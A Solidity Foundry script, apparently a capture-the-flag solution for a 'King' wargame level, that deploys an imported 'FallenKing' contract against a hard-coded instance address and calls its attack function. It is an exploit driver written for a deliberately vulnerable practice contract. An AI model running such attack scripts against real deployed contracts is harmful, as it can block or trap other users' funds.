// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {FallenKing} from "../src/09_King.sol";

contract PoC is Script {
    address payable immutable king =
        payable(0xAee491172da8198a0bDCDE30455FE379E56d3711); // Replace with your King instance

    function run() external payable {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        FallenKing fallenKing = new FallenKing(king);
        fallenKing.attack();

        vm.stopBroadcast();
    }
}
